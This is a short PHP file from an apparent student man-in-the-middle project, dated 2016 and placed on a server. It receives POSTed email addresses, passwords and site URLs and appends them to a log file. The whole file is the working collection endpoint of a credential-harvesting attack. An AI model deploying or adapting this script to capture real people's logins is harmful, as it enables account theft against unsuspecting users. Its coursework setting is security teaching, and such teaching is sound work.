<?php
/* Author: Alexis Thual && Victor Quach
 * Date : June 9, 2016
 * Project : MITM (INF474X)
 * 
 * Location: VPS, /var/www/modal/traitement.php
 * This PHP file expects POST requests to be made and logs passwords to a log file
 * */
  $logs_file = fopen("logs.txt", "a");
  setlocale(LC_ALL, 'fr_FR');
  $log = time();

  // If one actually receives the login and password
  // then the log is written
  if(isset($_POST["pass"]) && isset($_POST["email"]) && isset($_POST["url"])) {
    $log = $log . " " . $_POST["url"] . " " . $_POST["email"] . " " . $_POST["pass"] . "\n";
  }

  fwrite($logs_file, $log);
  fclose($logs_file);
?>
